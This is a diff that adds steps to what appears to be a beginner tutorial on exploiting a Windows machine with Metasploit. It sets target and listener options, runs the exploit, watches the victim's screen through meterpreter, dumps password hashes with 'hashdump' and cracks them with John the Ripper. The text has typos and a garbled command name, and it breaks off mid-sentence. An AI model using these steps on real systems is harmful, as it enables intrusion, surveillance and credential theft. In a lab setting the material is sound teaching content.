@@ -47,4 +47,37 @@ As we acan see there are 6 exploits for this vulnerability, we will be using the
 
     use 0
 
+### • 5. Setting up Msfconsole : 
+
+• Now we have to set up our msfconsole by seeing all the options that wre neede to be filled by watching them carefully ***"Show options"***
+
+    show options
+
+now as we can see above we have to fill LPORT, LHOST, RHOSTS & RPORT by using :
+
+    set RHOSTS >The Recivers Ip<
+    set LHOST >The Linux Ip<
+    set RPORT >The Reciving Port<
+    set LPORT >The Listening Port<
+
+⇨   After setting all tht we just simply have to Use ***"exploit"*** command
+
+     exploit
+
+• Now we have successfully gained the access of the Windows Machine, now we can use ***"help "*** command to get all the details of what can we do in the system, for example :
+
+• screensahre : it is a command by which we can see what is going on the target device in realtime it hosts a realtime screen of the Target
+  
+    sharescreen
  
+• hashdump : command to get all the hash of the password which the Target device is currently holding into it.
+    
+    hashdump
+    
+    
+• After getting all the hash informations of the user, we have to save it and 
+
+#### ◙ HASH ENUMERATION :
+  For this we will be using a tool called John The Ripper with the command:
+
+    john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt hashfile.txt
